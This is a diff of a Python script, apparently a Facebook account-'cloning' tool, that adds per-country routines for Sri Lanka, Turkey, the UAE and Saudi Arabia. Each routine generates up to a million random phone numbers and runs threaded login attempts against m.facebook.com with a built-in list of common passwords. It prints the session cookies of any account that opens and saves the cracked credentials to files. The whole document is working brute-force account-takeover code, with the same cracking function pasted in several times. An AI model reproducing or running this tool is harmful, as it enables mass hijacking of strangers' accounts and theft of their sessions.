+				cps.append(cid)
+				break
+			else:
+				continue
+		loop+=1
+		sys.stdout.write(f'\r\r%s{x}[{xr}ⓇDX{x}][%s|%s]\033[1;92[OK:{xr}%s{x}]\033[1;91[CP:{xr}%s{x}]'%(H,loop,tl,len(oks),len(cps))),
+		sys.stdout.flush()
+	except:
+		pass
+
 
 def sri():
+	user=[]
+	twf =[]
+	os.getuid
+	os.geteuid
+	os.system('clear')
+	print(logo1)
+	print("\033[1;92mWHAT IS YOUR NAME?")
+	name=input("\033[1;92mUSER NAME : \033[1;92m")
+	os.system('clear')
 	print(logo27)
 	print("\x1b[1;97m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.71,72,73,74,75,76,77,78")
+	code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+	k="+94"
+	codex = ''.join(random.choice(string.digits) for _ in range(2))
+	os.system('clear')
+	print(logo36)
+	limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m500,\x1b[38;5;208m1000,\033[0;92m2000,\033[0;93m3000,\x1b[38;5;208m5000,\033[0;92m10000,\033[0;93m20000,\x1b[38;5;208m30000,\033[0;92m50000,\033[0;93m100000,\x1b[38;5;208m1000000 ] \n\033[0;95m══════════════════════════════════════════════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		user.append(nmp)
+	os.system("clear")
+	print(logo53)
+	passx = 0
+	RdxID = []
+	print("")
+	for bilal in range(passx):
+		pww = input(f"[*] Enter Password {bilal+1} : ")
+		RdxID.append(pww)
+	with ThreadPool(max_workers=50) as manshera:
+		os.system("clear")
+		print(logo+logo27)
+		tl = str(len(user))
+		jalan('\033[1;97m====================================================')
+		jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
+		jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
+		jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
+		jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
+		jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
+		jalan('\033[1;97m====================================================')
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mNAME           \033[1;34m: \033[0;97m"+name)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAGENTS          \033[1;34m: \033[0;34m"+str(len(ugen)))
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAuto Sim Code       \033[1;34m: \033[0;97m"+code)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mCountry Code       \033[1;34m: \033[0;97m"+k)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mSTART TIME     \033[1;34m: \033[0;97m{Da}/{Mo}/{Ya} ~  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+		print(f"\x1b[1;94m\x1b[1;92m═━═━═━═━═━━═━═━═\033[1;92m R\033[1;93mD\033[1;94mX\033[1;95m-7\033[1;96m6\033[1;95m\033[1;94m\033[1;96m\x1b[1;92m ═━═━═━═━═━━═━═━═\x1b[1;91m ●   ")
+		print ('')
+		for co in user:
+			uid = k+code+codex+co
+			pwx = [code+'1990',codex+'2000',code+codex,code+'123',code+'1234',code+'12345',code+co,codex+'123',codex+'1234',codex+'12345',code+co ,code+codex+co,codex+code+co,code+codex+co,code+co+co,'password','1234567890','Bangladesh','joy4567','angel123','1234987','mafkor','passwordki','rajarani','baburma','1234567','amirtumi','kisuinah','kisuina','shundori','janina','bolbona','shudhutumi','aminastik','iskonbangladesh','chottogram','sunnyleone','paglahawa','aimontumakedilam','babukhaiso','please','monster','playboy','Password','Freefire','FREEFIRE','Freefire123','freefire123','pubg1234','pubg123','Pubg1234','Pubgmobile','Pubg123','rokunmia','pubgmobile','khan123','rajonmia','siamhosen','akashnil','abujuber','shunabondhu','boshonto','australia','january','gazipur','mymensing','amarjan','valotheko','shonarbangla','Bangladesh','monvalonei','tumishuduamr','bongobondhu','janinah','tuipagol','bangladesh','I LOVE YOU','freefire','passwordnai','I  Love You','Iloveyou','iloveyou','i love you','octopus','joybangla','zr%Xd665a','RE9iKR=GG','RT@oAwy5t']
+			manshera.submit(rcrackx,uid,pwx,tl)
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('\x1b[1;94mCrack process has been completed')
+	print('\x1b[1;94mIDs saved in \033[0;92mⓇDX-OK-1.txt,\x1b[1;91mⓇDX-CP-1.txt')
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('')
+	print('')
+	print('\x1b[1;96mChose An Option')
+	print('\x1b[1;92m [1] Continue ')
+	print('\x1b[1;91m [0] Exit ')
+	now = input('\x1b[1;96mSelect :-')
+	if now=='1':
+		login()
+	elif now=='0':
+		exit()
+
+
+
+def rcrackx(uid,pwx,tl):
+	#print(user)
+	global loop
+	global cps
+	global oks
+	global proxy
 	try:
-		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
-		k="+94"
-		os.system('clear')
-		print(logo)
-		print(logo27)
-		main()
-	except IOError:
-		print("[!] File Not Found")
-		input("\n[ Back ]")
-		Rdx1x()
+		for ps in pwx:
+			pro = random.choice(ugen)
+			session = requests.Session()
+			free_fb = session.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
+			log_data = {
+				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+			"try_number":"0",
+			"unrecognized_tries":"0",
+			"email":uid,
+			"pass":ps,
+			"login":"Log In"}
+			header_freefb = {"authority": 'mbasic.facebook.com',
+    "method": 'GET',
+    "scheme": 'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'referer': 'https://mbasic.facebook.com/?stype=lo&jlou=AfenWrDJrg6bli4boZ0PkVBdHonIEbBOk-nUPN_lXmQACJRdEMH0WKUgR5wjxf2v3HVgphCTlJh0qLL4qII9KsXB1yNQu8nowexJyi_4mqpJkg&smuh=36411&lh=Ac-CgbcnzaD0nRh-mHA&wtsid=rdr_0adeBNCcgVOy0KeJ5&refid=8&ref_component=mbasic_footer&_rdr',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': pro}
+			lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+			log_cookies=session.cookies.get_dict().keys()
+			if 'c_user' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[7:22]
+				print('\r\r\033[1;32m[ⓇDX-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎Ⓡ]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+				cek_apk(session,coki)
+				open('/sdcard/ⓇDX-OK-1.txt', 'a').write( uid+' | '+ps+'\n')
+				oks.append(cid)
+				break
+			elif 'checkpoint' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[24:39]
+				#print('\r\r\33[1;30m[ⓇDX-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
+				open('/sdcard/ⓇDX-CP-1.txt', 'a').write( uid+' | '+ps+' \n')
+				cps.append(cid)
+				break
+			else:
+				continue
+		loop+=1
+		sys.stdout.write(f'\r\r%s{x}[{xr}ⓇDX{x}][%s|%s]\033[1;92[OK:{xr}%s{x}]\033[1;91[CP:{xr}%s{x}]'%(H,loop,tl,len(oks),len(cps))),
+		sys.stdout.flush()
+	except:
+		pass
+
 
 def turkey():
+	user=[]
+	twf =[]
+	os.getuid
+	os.geteuid
+	os.system('clear')
+	print(logo1)
+	print("\033[1;92mWHAT IS YOUR NAME?")
+	name=input("\033[1;92mUSER NAME : \033[1;92m")
+	os.system('clear')
 	print(logo28)
 	print("\x1b[1;97m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.55,54,53,52,50")
+	code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+	k="+90"
+	codex = ''.join(random.choice(string.digits) for _ in range(2))
+	os.system('clear')
+	print(logo36)
+	limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m500,\x1b[38;5;208m1000,\033[0;92m2000,\033[0;93m3000,\x1b[38;5;208m5000,\033[0;92m10000,\033[0;93m20000,\x1b[38;5;208m30000,\033[0;92m50000,\033[0;93m100000,\x1b[38;5;208m1000000 ] \n\033[0;95m══════════════════════════════════════════════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		user.append(nmp)
+	os.system("clear")
+	print(logo53)
+	passx = 0
+	RdxID = []
+	print("")
+	for bilal in range(passx):
+		pww = input(f"[*] Enter Password {bilal+1} : ")
+		RdxID.append(pww)
+	with ThreadPool(max_workers=50) as manshera:
+		os.system("clear")
+		print(logo+logo28)
+		tl = str(len(user))
+		jalan('\033[1;97m====================================================')
+		jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
+		jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
+		jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
+		jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
+		jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
+		jalan('\033[1;97m====================================================')
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mNAME           \033[1;34m: \033[0;97m"+name)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAGENTS          \033[1;34m: \033[0;34m"+str(len(ugen)))
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAuto Sim Code       \033[1;34m: \033[0;97m"+code)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mCountry Code       \033[1;34m: \033[0;97m"+k)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mSTART TIME     \033[1;34m: \033[0;97m{Da}/{Mo}/{Ya} ~  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+		print(f"\x1b[1;94m\x1b[1;92m═━═━═━═━═━━═━═━═\033[1;92m R\033[1;93mD\033[1;94mX\033[1;95m-7\033[1;96m6\033[1;95m\033[1;94m\033[1;96m\x1b[1;92m ═━═━═━═━═━━═━═━═\x1b[1;91m ●   ")
+		print ('')
+		for co in user:
+			uid = k+code+codex+co
+			pwx = [code+'1990',codex+'2000',code+codex,code+'123',code+'1234',code+'12345',code+co,codex+'123',codex+'1234',codex+'12345',code+co ,code+codex+co,codex+code+co,code+codex+co,code+co+co,'password','1234567890','Bangladesh','joy4567','angel123','1234987','mafkor','passwordki','rajarani','baburma','1234567','amirtumi','kisuinah','kisuina','shundori','janina','bolbona','shudhutumi','aminastik','iskonbangladesh','chottogram','sunnyleone','paglahawa','aimontumakedilam','babukhaiso','please','monster','playboy','Password','Freefire','FREEFIRE','Freefire123','freefire123','pubg1234','pubg123','Pubg1234','Pubgmobile','Pubg123','rokunmia','pubgmobile','khan123','rajonmia','siamhosen','akashnil','abujuber','shunabondhu','boshonto','australia','january','gazipur','mymensing','amarjan','valotheko','shonarbangla','Bangladesh','monvalonei','tumishuduamr','bongobondhu','janinah','tuipagol','bangladesh','I LOVE YOU','freefire','passwordnai','I  Love You','Iloveyou','iloveyou','i love you','octopus','joybangla','zr%Xd665a','RE9iKR=GG','RT@oAwy5t']
+			manshera.submit(rcrackx,uid,pwx,tl)
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('\x1b[1;94mCrack process has been completed')
+	print('\x1b[1;94mIDs saved in \033[0;92mⓇDX-OK-1.txt,\x1b[1;91mⓇDX-CP-1.txt')
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('')
+	print('')
+	print('\x1b[1;96mChose An Option')
+	print('\x1b[1;92m [1] Continue ')
+	print('\x1b[1;91m [0] Exit ')
+	now = input('\x1b[1;96mSelect :-')
+	if now=='1':
+		login()
+	elif now=='0':
+		exit()
+
+
+
+def rcrackx(uid,pwx,tl):
+	#print(user)
+	global loop
+	global cps
+	global oks
+	global proxy
 	try:
-		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
-		k="+90"
-		os.system('clear')
-		print(logo)
-		print(logo28)
-		main()
-	except IOError:
-		print("[!] File Not Found")
-		input("\n[ Back ]")
-		Rdx1x()
+		for ps in pwx:
+			pro = random.choice(ugen)
+			session = requests.Session()
+			free_fb = session.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
+			log_data = {
+				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+			"try_number":"0",
+			"unrecognized_tries":"0",
+			"email":uid,
+			"pass":ps,
+			"login":"Log In"}
+			header_freefb = {"authority": 'mbasic.facebook.com',
+    "method": 'GET',
+    "scheme": 'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'referer': 'https://mbasic.facebook.com/?stype=lo&jlou=AfenWrDJrg6bli4boZ0PkVBdHonIEbBOk-nUPN_lXmQACJRdEMH0WKUgR5wjxf2v3HVgphCTlJh0qLL4qII9KsXB1yNQu8nowexJyi_4mqpJkg&smuh=36411&lh=Ac-CgbcnzaD0nRh-mHA&wtsid=rdr_0adeBNCcgVOy0KeJ5&refid=8&ref_component=mbasic_footer&_rdr',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': pro}
+			lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+			log_cookies=session.cookies.get_dict().keys()
+			if 'c_user' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[7:22]
+				print('\r\r\033[1;32m[ⓇDX-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎Ⓡ]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+				cek_apk(session,coki)
+				open('/sdcard/ⓇDX-OK-1.txt', 'a').write( uid+' | '+ps+'\n')
+				oks.append(cid)
+				break
+			elif 'checkpoint' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[24:39]
+				#print('\r\r\33[1;30m[ⓇDX-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
+				open('/sdcard/ⓇDX-CP-1.txt', 'a').write( uid+' | '+ps+' \n')
+				cps.append(cid)
+				break
+			else:
+				continue
+		loop+=1
+		sys.stdout.write(f'\r\r%s{x}[{xr}ⓇDX{x}][%s|%s]\033[1;92[OK:{xr}%s{x}]\033[1;91[CP:{xr}%s{x}]'%(H,loop,tl,len(oks),len(cps))),
+		sys.stdout.flush()
+	except:
+		pass
+
 
 def uae():
+	user=[]
+	twf =[]
+	os.getuid
+	os.geteuid
+	os.system('clear')
+	print(logo1)
+	print("\033[1;92mWHAT IS YOUR NAME?")
+	name=input("\033[1;92mUSER NAME : \033[1;92m")
+	os.system('clear')
 	print(logo29)
 	print("\x1b[1;97m(leave the first tree digits and the last seven digits of any phone number in this country.Write the remaining digits here.50,55,58,54,56")
+	code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+	k="+971"
+	codex = ''.join(random.choice(string.digits) for _ in range(2))
+	os.system('clear')
+	print(logo36)
+	limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m500,\x1b[38;5;208m1000,\033[0;92m2000,\033[0;93m3000,\x1b[38;5;208m5000,\033[0;92m10000,\033[0;93m20000,\x1b[38;5;208m30000,\033[0;92m50000,\033[0;93m100000,\x1b[38;5;208m1000000 ] \n\033[0;95m══════════════════════════════════════════════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		user.append(nmp)
+	os.system("clear")
+	print(logo53)
+	passx = 0
+	RdxID = []
+	print("")
+	for bilal in range(passx):
+		pww = input(f"[*] Enter Password {bilal+1} : ")
+		RdxID.append(pww)
+	with ThreadPool(max_workers=50) as manshera:
+		os.system("clear")
+		print(logo+logo29)
+		tl = str(len(user))
+		jalan('\033[1;97m====================================================')
+		jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
+		jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
+		jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
+		jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
+		jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
+		jalan('\033[1;97m====================================================')
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mNAME           \033[1;34m: \033[0;97m"+name)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAGENTS          \033[1;34m: \033[0;34m"+str(len(ugen)))
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAuto Sim Code       \033[1;34m: \033[0;97m"+code)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mCountry Code       \033[1;34m: \033[0;97m"+k)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mSTART TIME     \033[1;34m: \033[0;97m{Da}/{Mo}/{Ya} ~  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+		print(f"\x1b[1;94m\x1b[1;92m═━═━═━═━═━━═━═━═\033[1;92m R\033[1;93mD\033[1;94mX\033[1;95m-7\033[1;96m6\033[1;95m\033[1;94m\033[1;96m\x1b[1;92m ═━═━═━═━═━━═━═━═\x1b[1;91m ●   ")
+		print ('')
+		for co in user:
+			uid = k+code+codex+co
+			pwx = [code+'1990',codex+'2000',code+codex,code+'123',code+'1234',code+'12345',code+co,codex+'123',codex+'1234',codex+'12345',code+co ,code+codex+co,codex+code+co,code+codex+co,code+co+co,'password','1234567890','Bangladesh','joy4567','angel123','1234987','mafkor','passwordki','rajarani','baburma','1234567','amirtumi','kisuinah','kisuina','shundori','janina','bolbona','shudhutumi','aminastik','iskonbangladesh','chottogram','sunnyleone','paglahawa','aimontumakedilam','babukhaiso','please','monster','playboy','Password','Freefire','FREEFIRE','Freefire123','freefire123','pubg1234','pubg123','Pubg1234','Pubgmobile','Pubg123','rokunmia','pubgmobile','khan123','rajonmia','siamhosen','akashnil','abujuber','shunabondhu','boshonto','australia','january','gazipur','mymensing','amarjan','valotheko','shonarbangla','Bangladesh','monvalonei','tumishuduamr','bongobondhu','janinah','tuipagol','bangladesh','I LOVE YOU','freefire','passwordnai','I  Love You','Iloveyou','iloveyou','i love you','octopus','joybangla','zr%Xd665a','RE9iKR=GG','RT@oAwy5t']
+			manshera.submit(rcrackx,uid,pwx,tl)
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('\x1b[1;94mCrack process has been completed')
+	print('\x1b[1;94mIDs saved in \033[0;92mⓇDX-OK-1.txt,\x1b[1;91mⓇDX-CP-1.txt')
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('')
+	print('')
+	print('\x1b[1;96mChose An Option')
+	print('\x1b[1;92m [1] Continue ')
+	print('\x1b[1;91m [0] Exit ')
+	now = input('\x1b[1;96mSelect :-')
+	if now=='1':
+		login()
+	elif now=='0':
+		exit()
+
+
+
+def rcrackx(uid,pwx,tl):
+	#print(user)
+	global loop
+	global cps
+	global oks
+	global proxy
 	try:
-		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
-		k="+971"
-		os.system('clear')
-		print(logo)
-		print(logo29)
-		main()
-	except IOError:
-		print("[!] File Not Found")
-		input("\n[ Back ]")
-		Rdx1x()
+		for ps in pwx:
+			pro = random.choice(ugen)
+			session = requests.Session()
+			free_fb = session.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
+			log_data = {
+				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+			"try_number":"0",
+			"unrecognized_tries":"0",
+			"email":uid,
+			"pass":ps,
+			"login":"Log In"}
+			header_freefb = {"authority": 'mbasic.facebook.com',
+    "method": 'GET',
+    "scheme": 'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'referer': 'https://mbasic.facebook.com/?stype=lo&jlou=AfenWrDJrg6bli4boZ0PkVBdHonIEbBOk-nUPN_lXmQACJRdEMH0WKUgR5wjxf2v3HVgphCTlJh0qLL4qII9KsXB1yNQu8nowexJyi_4mqpJkg&smuh=36411&lh=Ac-CgbcnzaD0nRh-mHA&wtsid=rdr_0adeBNCcgVOy0KeJ5&refid=8&ref_component=mbasic_footer&_rdr',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': pro}
+			lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+			log_cookies=session.cookies.get_dict().keys()
+			if 'c_user' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[7:22]
+				print('\r\r\033[1;32m[ⓇDX-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎Ⓡ]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+				cek_apk(session,coki)
+				open('/sdcard/ⓇDX-OK-1.txt', 'a').write( uid+' | '+ps+'\n')
+				oks.append(cid)
+				break
+			elif 'checkpoint' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[24:39]
+				#print('\r\r\33[1;30m[ⓇDX-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
+				open('/sdcard/ⓇDX-CP-1.txt', 'a').write( uid+' | '+ps+' \n')
+				cps.append(cid)
+				break
+			else:
+				continue
+		loop+=1
+		sys.stdout.write(f'\r\r%s{x}[{xr}ⓇDX{x}][%s|%s]\033[1;92[OK:{xr}%s{x}]\033[1;91[CP:{xr}%s{x}]'%(H,loop,tl,len(oks),len(cps))),
+		sys.stdout.flush()
+	except:
+		pass
+
 
 def saudi():
+	user=[]
+	twf =[]
+	os.getuid
+	os.geteuid
+	os.system('clear')
+	print(logo1)
+	print("\033[1;92mWHAT IS YOUR NAME?")
+	name=input("\033[1;92mUSER NAME : \033[1;92m")
+	os.system('clear')
 	print (logo30)
-	print("\x1b[1;97m(leave the first three digits and the last seven digits of any phone number in this country.Write the remaining digits here.50,51,52,53,54,55,56,57,58,")
+	print("\x1b[1;97m1,2,3,4 5,6,7,8,50,51,52,53,54,55,56,57,58,")
+	code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+	k="+966"
+	codex = ''.join(random.choice(string.digits) for _ in range(2))
+	os.system('clear')
+	print(logo36)
+	limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m500,\x1b[38;5;208m1000,\033[0;92m2000,\033[0;93m3000,\x1b[38;5;208m5000,\033[0;92m10000,\033[0;93m20000,\x1b[38;5;208m30000,\033[0;92m50000,\033[0;93m100000,\x1b[38;5;208m1000000 ] \n\033[0;95m══════════════════════════════════════════════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		user.append(nmp)
+	os.system("clear")
+	print(logo53)
+	passx = 0
+	RdxID = []
+	print("")
+	for bilal in range(passx):
+		pww = input(f"[*] Enter Password {bilal+1} : ")
+		RdxID.append(pww)
+	with ThreadPool(max_workers=50) as manshera:
+		os.system("clear")
+		print(logo+logo30)
+		tl = str(len(user))
+		jalan('\033[1;97m====================================================')
+		jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
+		jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
+		jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
+		jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
+		jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
+		jalan('\033[1;97m====================================================')
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mNAME           \033[1;34m: \033[0;97m"+name)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAGENTS          \033[1;34m: \033[0;34m"+str(len(ugen)))
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mAuto Sim Code       \033[1;34m: \033[0;97m"+code)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mCountry Code       \033[1;34m: \033[0;97m"+k)
+		print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mSTART TIME     \033[1;34m: \033[0;97m{Da}/{Mo}/{Ya} ~  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+		print(f"\x1b[1;94m\x1b[1;92m═━═━═━═━═━━═━═━═\033[1;92m R\033[1;93mD\033[1;94mX\033[1;95m-7\033[1;96m6\033[1;95m\033[1;94m\033[1;96m\x1b[1;92m ═━═━═━═━═━━═━═━═\x1b[1;91m ●   ")
+		print ('')
+		for co in user:
+			uid = k+code+codex+co
+			pwx = [code+'1990',codex+'2000',code+codex,code+'123',code+'1234',code+'12345',code+co,codex+'123',codex+'1234',codex+'12345',code+co ,code+codex+co,codex+code+co,code+codex+co,code+co+co,'password','1234567890','Bangladesh','joy4567','angel123','1234987','mafkor','passwordki','rajarani','baburma','1234567','amirtumi','kisuinah','kisuina','shundori','janina','bolbona','shudhutumi','aminastik','iskonbangladesh','chottogram','sunnyleone','paglahawa','aimontumakedilam','babukhaiso','please','monster','playboy','Password','Freefire','FREEFIRE','Freefire123','freefire123','pubg1234','pubg123','Pubg1234','Pubgmobile','Pubg123','rokunmia','pubgmobile','khan123','rajonmia','siamhosen','akashnil','abujuber','shunabondhu','boshonto','australia','january','gazipur','mymensing','amarjan','valotheko','shonarbangla','Bangladesh','monvalonei','tumishuduamr','bongobondhu','janinah','tuipagol','bangladesh','I LOVE YOU','freefire','passwordnai','I  Love You','Iloveyou','iloveyou','i love you','octopus','joybangla','zr%Xd665a','RE9iKR=GG','RT@oAwy5t']
+			manshera.submit(rcrackx,uid,pwx,tl)
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('\x1b[1;94mCrack process has been completed')
